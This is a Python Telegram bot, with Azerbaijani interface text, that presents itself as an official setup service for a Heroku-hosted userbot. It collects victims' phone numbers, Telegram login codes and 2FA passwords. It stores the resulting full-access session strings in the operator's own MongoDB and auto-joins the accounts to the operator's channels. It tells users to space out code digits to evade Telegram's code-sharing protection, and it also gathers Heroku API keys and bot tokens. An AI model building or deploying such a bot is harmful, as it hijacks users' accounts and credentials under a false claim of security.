import os
import heroku3
import asyncio
import requests
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PasswordHashInvalidError
)
from telethon.tl.functions.channels import JoinChannelRequest
from motor.motor_asyncio import AsyncIOMotorClient

# --- PROFESSIONAL CONFIGURATION ---
# Məlumatlar Heroku Config Vars (Settings) bölməsindən çəkilir.
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
MONGO_URL = os.environ.get("MONGO_URL")
GITHUB_REPO = "https://github.com/Xeyaldi/userbot"

# MongoDB Bağlantı Protokolu
mongo_client = AsyncIOMotorClient(MONGO_URL)
db = mongo_client["ht_generator_db"]
users_col = db["users"]

# Setup Bot İnstansiyası
bot = TelegramClient('ht_setup_bot', API_ID, API_HASH)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "🛡 **HT USERBOT | Rəsmi Quraşdırma İnfrastrukturu**\n\n"
        "Sistemimiz istifadəçi təhlükəsizliyini və performansını ön planda tutan "
        "avtomatlaşdırılmış quraşdırma xidmətini təqdim edir.\n\n"
        "🔹 **Təhlükəsizlik:** Bütün məlumatlar şifrələnmiş kanallar vasitəsilə ötürülür.\n"
        "🔹 **Sürət:** Bulud texnologiyası sayəsində quraşdırma cəmi 120 saniyə çəkir.\n"
        "🔹 **Dəstək:** Tam professional interfeys və 7/24 rəsmi infrastruktur.\n\n"
        "Davam etməklə istifadə qaydalarını və təhlükəsizlik protokolunu qəbul etmiş olursunuz.",
        buttons=[
            [Button.inline("💎 Quraşdırmanı Başlat", data="setup")],
            [Button.url("🌐 Rəsmi Kanal", "https://t.me/ht_bots")]
        ]
    )

@bot.on(events.CallbackQuery(data="setup"))
async def setup_process(event):
    user_id = event.sender_id
    async with bot.conversation(event.chat_id) as conv:
        try:
            # 1. Addım: Nömrə İdentifikasiyası
            await conv.send_message(
                "📝 **Addım 1:** Hesabın identifikasiyası üçün telefon nömrənizi daxil edin.\n"
                "_(Məsələn: +994XXXXXXXXX)_"
            )
            phone_res = await conv.get_response()
            phone = phone_res.text
            
            # Müvəqqəti Telegram Client yaradılır
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            
            try:
                await client.send_code_request(phone)
            except Exception as e:
                await conv.send_message(f"❌ **Sistem Xətası:** {e}")
                return

            # 2. Addım: Təhlükəsizlik Protokolu (Kod)
            await conv.send_message(
                "🔐 **Addım 2:** Telegram tərəfindən göndərilən təhlükəsizlik kodunu daxil edin.\n\n"
                "⚠️ **Protokol:** Botun bloklanmaması üçün rəqəmlər arasına boşluq qoyun.\n"
                "Nümunə: `1 2 3 4 5`",
                parse_mode="markdown"
            )
            code_res = await conv.get_response()
            otp_code = code_res.text.replace(" ", "")

            try:
                await client.sign_in(phone, otp_code)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 **2FA (İkiadımlı təsdiq) parolu daxil edin:**")
                pwd_res = await conv.get_response()
                await client.sign_in(password=pwd_res.text)
            except (PhoneCodeInvalidError, PasswordHashInvalidError):
                await conv.send_message("❌ **Xəta:** Daxil edilən məlumatlar yanlışdır. Yenidən /start yazın.")
                return

            # Session yaradılır və MongoDB-yə backup edilir
            string_session = client.session.save()
            await users_col.update_one(
                {"user_id": user_id},
                {"$set": {"phone": phone, "session": string_session}},
                upsert=True
            )

            # Rəsmi kanallara avtomatik inteqrasiya
            try:
                await client(JoinChannelRequest("@ht_bots"))
                await client(JoinChannelRequest("@sohbet_qrupus"))
            except:
                pass

            # 3. Addım: Xarici İnteqrasiya Ayarları
            await conv.send_message(
                "⚙️ **Addım 3:** Sistem inteqrasiyası üçün tələb olunan açarları daxil edin.\n\n"
                "🔹 **Heroku API Key:** Hesabınızın idarəetmə açarı.\n"
                "🔹 **App Name:** Botun bulud üzərindəki unikal adı."
            )
            
            await conv.send_message("🔑 **Heroku API Key:**")
            h_api = (await conv.get_response()).text
            
            await conv.send_message("🏷 **Heroku App Name:**")
            h_app_name = (await conv.get_response()).text.lower()

            await conv.send_message("🤖 **Köməkçi Bot Tokeni:**\n(@BotFather-dən aldığınız token)")
            helper_token = (await conv.get_response()).text

            await conv.send_message("💾 **MongoDB Linkiniz:**")
            user_mongo = (await conv.get_response()).text

            status_msg = await conv.send_message("⌛ **Sistem bulud serverlərinə yüklənir... Bu proses 120 saniyə çəkə bilər.**")

            # Heroku Deploy Prosesi
            try:
                h_conn = heroku3.from_key(h_api)
                app = h_conn.create_app(name=h_app_name, region_id_or_name='eu')
                
                app.config().update({
                    'API_ID': str(API_ID),
                    'API_HASH': API_HASH,
                    'SESSION_STRING': string_session,
                    'BOT_TOKEN': helper_token,
                    'MONGO_URL': user_mongo,
                    'OWNER_ID': str(user_id),
                    'LOG_GROUP_AUTO': "True"
                })

                source_url = f"https://api.github.com/repos/Xeyaldi/userbot/tarball/main"
                h_conn.create_build(app.id, source_url=source_url)

                await status_msg.edit(
                    "✅ **Quraşdırma Uğurla Tamamlandı!**\n\n"
                    "🚀 HT Userbot instansiyanız bulud serverlərinə yükləndi və aktivləşdirildi.\n\n"
                    "👤 **Status:** Aktiv\n"
                    "🛠 **Konfiqurasiya:** Professional\n"
                    "📢 **Məlumat:** Hesabınızda `.htlive` yazaraq sistemi test edə bilərsiniz.\n\n"
                    "Bizi seçdiyiniz üçün təşəkkür edirik."
                )
            except Exception as e:
                await status_msg.edit(f"❌ **Heroku İnteqrasiya Xətası:** {e}")

        except Exception as e:
            await conv.send_message(f"⚠️ **Gözlənilməz Xəta:** {e}")

# --- ASYNCIO EVENT LOOP PROTOCOL ---
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ HT Professional Setup Bot Onlayndır!")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        pass
